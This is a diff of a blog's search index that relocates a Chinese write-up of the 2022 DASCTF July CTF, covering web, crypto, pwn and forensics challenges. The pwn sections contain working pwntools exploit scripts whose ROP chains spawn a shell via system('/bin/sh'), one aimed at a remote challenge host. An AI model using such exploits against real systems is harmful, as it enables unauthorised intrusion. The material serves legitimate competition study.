@@ -1,134 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>2022DASCTF七月赋能赛</title>
-    <url>/2022/07/25/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/</url>
-    <content><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Ez-to-getflag-题"><a href="#Ez-to-getflag-题" class="headerlink" title="Ez to getflag 题"></a>Ez to getflag 题</h2><p>发现有查询功能，所以一开始查flag无果，转念一想如果是linux服务器的话应该再根目录下，所以在次查询&#x2F;flag，获得flag</p>
-<img src="/2022/07/25/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/clip_image002.png" class="" title="img">
-
-<img src="/2022/07/25/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/image-20220724185704918.png" class="" title="image-20220724185704918">
-
-
-
-<h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="babysign"><a href="#babysign" class="headerlink" title="babysign"></a>babysign</h2><p>本题使用椭圆曲线数字签名算法，由题意得secret由flag生成，所以需要通过加密方式反推求secret（即k）的公式</p>
-<p>已知：s&#x3D;<img src="/2022/07/25/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/clip_image002-16587282944209.gif" class="" title="img"> * (m + n*r) (mod gen)</p>
-<p>则：k&#x3D;<img src="/2022/07/25/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/clip_image004-165872829442010.gif" class="" title="img"> <em>(s</em>n-m) (mod gen)</p>
-<p><strong>EXP</strong></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> ecdsa.ecdsa <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> ecdsa</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">R=<span class="number">0x7b35712a50d463ac5acf7af1675b4b63ba0da23b6452023afddd58d4891ef6e5</span></span><br><span class="line">S=<span class="number">0xa452fc44cc36fa6964d1b4f47392ff0a91350cfd58f11a4645c084d56e387e5c</span></span><br><span class="line">msg=<span class="string">b&#x27;welcome to ecdsa&#x27;</span></span><br><span class="line">n=<span class="number">57872441580840888721108499129165088876046881204464784483281653404168342111855</span></span><br><span class="line">gen = ecdsa.NIST256p.generator.order()</span><br><span class="line">m= <span class="built_in">int</span>(hashlib.sha256(msg).hexdigest(), <span class="number">16</span>)</span><br><span class="line">k= ((S*n-m)*gmpy2.invert(R,gen)) % gen</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(k))</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="easyNTRU"><a href="#easyNTRU" class="headerlink" title="easyNTRU"></a>easyNTRU</h2><p>本题的考点是NTRU，由于e和h为多项式且项数均为10项并不多，所以可以考虑采用爆破的方法解出m</p>
-<p><strong>EXP</strong></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHA3_256</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"></span><br><span class="line">N = <span class="number">10</span></span><br><span class="line">p = <span class="number">3</span></span><br><span class="line">q = <span class="number">512</span></span><br><span class="line">d = <span class="number">3</span></span><br><span class="line">R.&lt;x&gt; = ZZ[]</span><br><span class="line">c=<span class="string">b&#x27;\xb9W\x8c\x8b\x0cG\xde\x7fl\xf7\x03\xbb9m\x0c\xc4L\xfe\xe9Q\xad\xfd\xda!\x1a\xea@&#125;U\x9ay4\x8a\xe3y\xdf\xd5BV\xa7\x06\xf9\x08\x96=&quot;f\xc1\x1b\xd7\xdb\xc1j\x82F\x0b\x16\x06\xbcJMB\xc8\x80&#x27;</span></span><br><span class="line">Num = [-<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i1 <span class="keyword">in</span> Num:</span><br><span class="line">    <span class="keyword">for</span> i2 <span class="keyword">in</span> Num:</span><br><span class="line">       <span class="keyword">for</span> i3 <span class="keyword">in</span> Num:</span><br><span class="line">          <span class="keyword">for</span> i4 <span class="keyword">in</span> Num:</span><br><span class="line">              <span class="keyword">for</span> i5 <span class="keyword">in</span> Num:</span><br><span class="line">                 <span class="keyword">for</span> i6 <span class="keyword">in</span> Num:</span><br><span class="line">                    <span class="keyword">for</span> i7 <span class="keyword">in</span> Num:</span><br><span class="line">                       <span class="keyword">for</span> i8 <span class="keyword">in</span> Num:</span><br><span class="line">                          <span class="keyword">for</span> i9 <span class="keyword">in</span> Num:</span><br><span class="line">                             <span class="keyword">for</span> i10 <span class="keyword">in</span> Num:</span><br><span class="line">                                 result = [i1, i2, i3, i4, i5, i6, i7, i8, i9, i10]</span><br><span class="line">                                 m = R(result)</span><br><span class="line">                                 sha3 = SHA3_256.new()</span><br><span class="line">                                 Key = sha3.update(<span class="built_in">bytes</span>(<span class="built_in">str</span>(m).encode(<span class="string">&#x27;utf-8&#x27;</span>))).digest()</span><br><span class="line">                                 dypher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">                                 <span class="keyword">try</span>:</span><br><span class="line">                                    flag = unpad(dypher.decrypt(c), <span class="number">32</span>)</span><br><span class="line">                                    <span class="keyword">if</span>  flag.startswith(<span class="string">b&#x27;DASCTF&#x27;</span>):</span><br><span class="line">                                          <span class="built_in">print</span>(flag)</span><br><span class="line">                                          sys.exit(<span class="number">0</span>)</span><br><span class="line">                                  <span class="keyword">except</span>:</span><br><span class="line">                                     <span class="keyword">pass</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="eyfor题"><a href="#eyfor题" class="headerlink" title="eyfor题"></a>eyfor题</h2><img src="/2022/07/25/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/image-20220724183747873.png" class="" title="image-20220724183747873">
-
-<p>上图中的代码存在负数绕过，导致可以向<code>nbytes</code>中写入任意长度的内容造成栈溢出。</p>
-<p>将“&#x2F;bin&#x2F;sh”写入<code>nbytes</code>中，通过<code>strncpy()</code>复制到<code>buf</code>中。</p>
-<img src="/2022/07/25/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/image-20220724184142775.png" class="" title="image-20220724184142775">
-
-<p><code>buf</code>在bss段上，函数也提供了<code>_system</code>，所以可以让<code>buf</code>作为<code>_system</code>参数。</p>
-<p><strong>EXP</strong></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27055</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn4&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn4&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">ret = <span class="number">0x400915</span></span><br><span class="line">pop_rdi = <span class="number">0x0400983</span></span><br><span class="line">io.recv()</span><br><span class="line">io.send(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line"><span class="comment">#io.recv()</span></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">0x38</span>, <span class="string">b&#x27;a&#x27;</span>) + p64(ret) + p64(pop_rdi) +  p64(<span class="number">0x06010C0</span>)+ p64(elf.symbols[<span class="string">&quot;system&quot;</span>])</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="MyCanary2题"><a href="#MyCanary2题" class="headerlink" title="MyCanary2题"></a>MyCanary2题</h2><img src="/2022/07/25/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/image-20220724184707602.png" class="" title="image-20220724184707602">
-
-<p>分析上诉代码可知，按case1、case2、case3的执行顺序即可绕过<code>if</code>的判断，并且case1存在栈溢出漏洞。</p>
-<img src="/2022/07/25/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/image-20220724184900448.png" class="" title="image-20220724184900448">
-
-<p>程序存在<code>_system</code>和<code>/bin/sh</code>，可以覆盖返回地址并调用执行<code>system(/bin/sh)</code>获得shell</p>
-<p><strong>EXP</strong></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./MyCanary2&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;node4.buuoj.cn&#x27;, 28231)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./MyCanary2&#x27;</span>)</span><br><span class="line">system_plt = elf.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x0401613</span></span><br><span class="line">ret = <span class="number">0x040101a</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Input your choice\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x6c</span> + p32(<span class="number">0</span>) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span> + p64(pop_rdi) + p64(<span class="number">0x04020F0</span>) + p64(system_plt)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Show me the code:\n&#x27;</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">pause()</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Input your choice\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;But now, I have a new Secret.&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Input your choice\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="ez-forenisc题"><a href="#ez-forenisc题" class="headerlink" title="ez_forenisc题"></a>ez_forenisc题</h2><p>下载附件</p>
-<p>得到pc.raw和pc.wmdk，，放入取证大师中发现是个bitlocker加密的磁盘</p>
-<p>立马转移注意到pc.raw上，是个内存镜像。直接用EFDD梭出恢复密钥</p>
-<p>060841-363737-551397-247489-310134-034430-598312-215853</p>
-<p>用取证大师进行解密</p>
-<img src="/2022/07/25/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/clip_image002.gif" class="" title="图片">
-
-<p>发现有个压缩包，导出，发现是张png图片，用stegsolve发现了rgb的0通道藏了压缩包</p>
-<img src="/2022/07/25/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/clip_image004.gif" class="" title="图片">
-
-<p>保存下来，发现压缩包损坏，直接使用winrar自带的修复功能修复，发现是个加密压缩包</p>
-<p>看到了压缩包还有提示</p>
-<img src="/2022/07/25/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/clip_image006.gif" class="" title="图片">
-
-<p>看来要找账户密码，用passwarekit也能梭出来</p>
-<img src="/2022/07/25/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/clip_image008.gif" class="" title="图片">
-
-<p>550f37c7748e</p>
-<p>解压得到八进制的数</p>
-<img src="/2022/07/25/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/clip_image010.gif" class="" title="图片">
-
-<img src="/2022/07/25/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/clip_image012.gif" class="" title="图片">
-
-<p>转为16进制是得到key是358daebef0b7d，貌似是什么的一个密钥，继续看看pc.raw</p>
-<p>用volatility分析一下，发现screenshot的截图有信息</p>
-<img src="/2022/07/25/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/clip_image014.gif" class="" title="图片">
-
-<p>提示了thes3cret，filescan查找该关键字</p>
-<img src="/2022/07/25/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/clip_image016.jpg" class="" title="图片">
-
-<p>发现了个文件，给它dump下来</p>
-<img src="/2022/07/25/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/clip_image018.gif" class="" title="图片">
-
-<p>记事本打开发现密文</p>
-<img src="/2022/07/25/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/clip_image020.gif" class="" title="图片">
-
-<p>接下来就是进行aes解密了</p>
-<img src="/2022/07/25/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/clip_image022.gif" class="" title="图片">
-
-<p>DASCTF{2df05d6846ea7a0ba948da44daa7dc88}</p>
-<h2 id="哆来咪发唆拉西哆"><a href="#哆来咪发唆拉西哆" class="headerlink" title="哆来咪发唆拉西哆"></a>哆来咪发唆拉西哆</h2><p>首先得到一个pdf，binwalk后有个zip，解压后有个txt</p>
-<img src="/2022/07/25/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/clip_image024.gif" class="" title="图片">
-
-<p>发现这应该是圆周率的后面的位数</p>
-<img src="/2022/07/25/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/clip_image026.gif" class="" title="图片">
-
-<img src="/2022/07/25/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/clip_image028.gif" class="" title="图片">
-
-<img src="/2022/07/25/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/clip_image030.gif" class="" title="图片">
-
-<img src="/2022/07/25/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/clip_image032.gif" class="" title="图片">
-
-<p>前一组都是255而后一组数都是211，根据数组的特性用脚本将数组转化</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">pi=<span class="string">&#x27;3.14159265358979323846264338327950288419716939937510582097494459230781640628620899862803482534211706798214808651328230664709384460955058223172535940812848111745028410270193852110555964462294895493038196442881097566593344612847564823378678316527120190914564856692346034861045432664821339360............5225161050702705623526601276484830840761183013052793205427462865403603674532865105706587488225698157936789766974220575059683440869735020141020672358502007245225632651341055924019027421624843914035998953539459094407046912091409387001264560016237428802109276457931065792295524988727584610126483699989225695968815920560010165525637567875678&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;whatisthis.txt&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)<span class="keyword">as</span> f:</span><br><span class="line"></span><br><span class="line">  lines=f.readlines()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line"></span><br><span class="line">  line=<span class="built_in">str</span>(line,encoding=<span class="string">&#x27;utf-8&#x27;</span>,errors=<span class="string">&#x27;strict&#x27;</span>)</span><br><span class="line"></span><br><span class="line">  a = []</span><br><span class="line"></span><br><span class="line">  a = re.findall(<span class="string">&quot;\d+\.?\d*&quot;</span>, line)</span><br><span class="line"></span><br><span class="line">  <span class="built_in">list</span>=[]</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line"></span><br><span class="line">   s=<span class="built_in">int</span>(a[i])</span><br><span class="line"></span><br><span class="line">   <span class="built_in">list</span>.append(pi[s:s+<span class="number">3</span>:])</span><br><span class="line"></span><br><span class="line">  str_dec=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(<span class="built_in">list</span>[<span class="number">1</span>])):</span><br><span class="line"></span><br><span class="line">   s= <span class="built_in">list</span>[<span class="number">0</span>][i]</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> <span class="built_in">list</span>[<span class="number">0</span>][i]==<span class="built_in">list</span>[<span class="number">1</span>][i] <span class="keyword">and</span> <span class="built_in">list</span>[<span class="number">0</span>][i]==<span class="built_in">list</span>[<span class="number">2</span>][i] <span class="keyword">and</span> <span class="built_in">list</span>[<span class="number">0</span>][i]==<span class="built_in">list</span>[<span class="number">3</span>][i]:</span><br><span class="line"></span><br><span class="line">​     str_dec+=s</span><br><span class="line"></span><br><span class="line">  str_hex=<span class="built_in">hex</span>(<span class="built_in">int</span>(str_dec))</span><br><span class="line"></span><br><span class="line">  str_hex=str_hex[<span class="number">2</span>:<span class="number">4</span>:]</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> <span class="built_in">len</span>(str_hex)==<span class="number">1</span>:</span><br><span class="line"></span><br><span class="line">   str_hex=<span class="string">&#x27;0&#x27;</span>+str_hex</span><br><span class="line"></span><br><span class="line">  <span class="built_in">print</span>(str_hex,end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<img src="/2022/07/25/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/clip_image034.gif" class="" title="图片">
-
-<p>运行得到</p>
-<p><code>ffd8ffe11b0245786966000049492a00080000000c000001030001000000ee02000001010300010000001a02000002010300030000009e0000000601030001000000020000001201030001000000010000001501030001000000030000001a01050001000000a40000001b01050001000000ac000000280103000100000002000000310102001e000000b40000003201020014000000d20000006987040001000000e80000002001000008000800080080fc0a001027000080fc0a001027000041646f62652050686f746f73686f7020435336202857696e646f77732900323032323a30343a32382031303a31343a35380000000400009007000............55d8abb15762aec55d8abb15762aec55d8abb15762aec55d8abb15762aec55d8abb15762aec55d8abb15762aec55d8abb15762aec55d8abb15762aec55d8abb15762aec55d8abb15762aec55d8abb15762aec55d8abb15762aec55d8abb15762aec55d8abb15762aec55d8abb15762aec55d8abb15762aec55d8abb15762aec593b15762c5d8abb15762aff00ffd9</code></p>
-<img src="/2022/07/25/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/clip_image036.gif" class="" title="图片">
-
-<p>转化后得到一张图片，保存后发现</p>
-<img src="/2022/07/25/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/clip_image038.jpg" class="" title="图片">
-
-<p>flag是10000后缺失的30个数字</p>
-<p>DASCTF{566722796619885782794848855834}</p>
-]]></content>
-      <categories>
-        <category>比赛</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
-        <tag>misc</tag>
-        <tag>web</tag>
-        <tag>Crypto</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>2022浙江省ctf决赛</title>
     <url>/2022/09/26/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%86%B3%E8%B5%9B/</url>
     <content><![CDATA[<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="checkin-gift"><a href="#checkin-gift" class="headerlink" title="checkin_gift"></a>checkin_gift</h2><p>下载附件，是一张图片</p>
@@ -254,8 +126,136 @@
       <tags>
         <tag>pwn</tag>
         <tag>misc</tag>
-        <tag>web</tag>
         <tag>re</tag>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2022DASCTF七月赋能赛</title>
+    <url>/2022/07/25/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/</url>
+    <content><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Ez-to-getflag-题"><a href="#Ez-to-getflag-题" class="headerlink" title="Ez to getflag 题"></a>Ez to getflag 题</h2><p>发现有查询功能，所以一开始查flag无果，转念一想如果是linux服务器的话应该再根目录下，所以在次查询&#x2F;flag，获得flag</p>
+<img src="/2022/07/25/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/clip_image002.png" class="" title="img">
+
+<img src="/2022/07/25/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/image-20220724185704918.png" class="" title="image-20220724185704918">
+
+
+
+<h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="babysign"><a href="#babysign" class="headerlink" title="babysign"></a>babysign</h2><p>本题使用椭圆曲线数字签名算法，由题意得secret由flag生成，所以需要通过加密方式反推求secret（即k）的公式</p>
+<p>已知：s&#x3D;<img src="/2022/07/25/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/clip_image002-16587282944209.gif" class="" title="img"> * (m + n*r) (mod gen)</p>
+<p>则：k&#x3D;<img src="/2022/07/25/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/clip_image004-165872829442010.gif" class="" title="img"> <em>(s</em>n-m) (mod gen)</p>
+<p><strong>EXP</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> ecdsa.ecdsa <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> ecdsa</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">R=<span class="number">0x7b35712a50d463ac5acf7af1675b4b63ba0da23b6452023afddd58d4891ef6e5</span></span><br><span class="line">S=<span class="number">0xa452fc44cc36fa6964d1b4f47392ff0a91350cfd58f11a4645c084d56e387e5c</span></span><br><span class="line">msg=<span class="string">b&#x27;welcome to ecdsa&#x27;</span></span><br><span class="line">n=<span class="number">57872441580840888721108499129165088876046881204464784483281653404168342111855</span></span><br><span class="line">gen = ecdsa.NIST256p.generator.order()</span><br><span class="line">m= <span class="built_in">int</span>(hashlib.sha256(msg).hexdigest(), <span class="number">16</span>)</span><br><span class="line">k= ((S*n-m)*gmpy2.invert(R,gen)) % gen</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(k))</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="easyNTRU"><a href="#easyNTRU" class="headerlink" title="easyNTRU"></a>easyNTRU</h2><p>本题的考点是NTRU，由于e和h为多项式且项数均为10项并不多，所以可以考虑采用爆破的方法解出m</p>
+<p><strong>EXP</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHA3_256</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"></span><br><span class="line">N = <span class="number">10</span></span><br><span class="line">p = <span class="number">3</span></span><br><span class="line">q = <span class="number">512</span></span><br><span class="line">d = <span class="number">3</span></span><br><span class="line">R.&lt;x&gt; = ZZ[]</span><br><span class="line">c=<span class="string">b&#x27;\xb9W\x8c\x8b\x0cG\xde\x7fl\xf7\x03\xbb9m\x0c\xc4L\xfe\xe9Q\xad\xfd\xda!\x1a\xea@&#125;U\x9ay4\x8a\xe3y\xdf\xd5BV\xa7\x06\xf9\x08\x96=&quot;f\xc1\x1b\xd7\xdb\xc1j\x82F\x0b\x16\x06\xbcJMB\xc8\x80&#x27;</span></span><br><span class="line">Num = [-<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i1 <span class="keyword">in</span> Num:</span><br><span class="line">    <span class="keyword">for</span> i2 <span class="keyword">in</span> Num:</span><br><span class="line">       <span class="keyword">for</span> i3 <span class="keyword">in</span> Num:</span><br><span class="line">          <span class="keyword">for</span> i4 <span class="keyword">in</span> Num:</span><br><span class="line">              <span class="keyword">for</span> i5 <span class="keyword">in</span> Num:</span><br><span class="line">                 <span class="keyword">for</span> i6 <span class="keyword">in</span> Num:</span><br><span class="line">                    <span class="keyword">for</span> i7 <span class="keyword">in</span> Num:</span><br><span class="line">                       <span class="keyword">for</span> i8 <span class="keyword">in</span> Num:</span><br><span class="line">                          <span class="keyword">for</span> i9 <span class="keyword">in</span> Num:</span><br><span class="line">                             <span class="keyword">for</span> i10 <span class="keyword">in</span> Num:</span><br><span class="line">                                 result = [i1, i2, i3, i4, i5, i6, i7, i8, i9, i10]</span><br><span class="line">                                 m = R(result)</span><br><span class="line">                                 sha3 = SHA3_256.new()</span><br><span class="line">                                 Key = sha3.update(<span class="built_in">bytes</span>(<span class="built_in">str</span>(m).encode(<span class="string">&#x27;utf-8&#x27;</span>))).digest()</span><br><span class="line">                                 dypher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">                                 <span class="keyword">try</span>:</span><br><span class="line">                                    flag = unpad(dypher.decrypt(c), <span class="number">32</span>)</span><br><span class="line">                                    <span class="keyword">if</span>  flag.startswith(<span class="string">b&#x27;DASCTF&#x27;</span>):</span><br><span class="line">                                          <span class="built_in">print</span>(flag)</span><br><span class="line">                                          sys.exit(<span class="number">0</span>)</span><br><span class="line">                                  <span class="keyword">except</span>:</span><br><span class="line">                                     <span class="keyword">pass</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="eyfor题"><a href="#eyfor题" class="headerlink" title="eyfor题"></a>eyfor题</h2><img src="/2022/07/25/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/image-20220724183747873.png" class="" title="image-20220724183747873">
+
+<p>上图中的代码存在负数绕过，导致可以向<code>nbytes</code>中写入任意长度的内容造成栈溢出。</p>
+<p>将“&#x2F;bin&#x2F;sh”写入<code>nbytes</code>中，通过<code>strncpy()</code>复制到<code>buf</code>中。</p>
+<img src="/2022/07/25/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/image-20220724184142775.png" class="" title="image-20220724184142775">
+
+<p><code>buf</code>在bss段上，函数也提供了<code>_system</code>，所以可以让<code>buf</code>作为<code>_system</code>参数。</p>
+<p><strong>EXP</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27055</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn4&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn4&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">ret = <span class="number">0x400915</span></span><br><span class="line">pop_rdi = <span class="number">0x0400983</span></span><br><span class="line">io.recv()</span><br><span class="line">io.send(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line"><span class="comment">#io.recv()</span></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">0x38</span>, <span class="string">b&#x27;a&#x27;</span>) + p64(ret) + p64(pop_rdi) +  p64(<span class="number">0x06010C0</span>)+ p64(elf.symbols[<span class="string">&quot;system&quot;</span>])</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="MyCanary2题"><a href="#MyCanary2题" class="headerlink" title="MyCanary2题"></a>MyCanary2题</h2><img src="/2022/07/25/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/image-20220724184707602.png" class="" title="image-20220724184707602">
+
+<p>分析上诉代码可知，按case1、case2、case3的执行顺序即可绕过<code>if</code>的判断，并且case1存在栈溢出漏洞。</p>
+<img src="/2022/07/25/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/image-20220724184900448.png" class="" title="image-20220724184900448">
+
+<p>程序存在<code>_system</code>和<code>/bin/sh</code>，可以覆盖返回地址并调用执行<code>system(/bin/sh)</code>获得shell</p>
+<p><strong>EXP</strong></p>
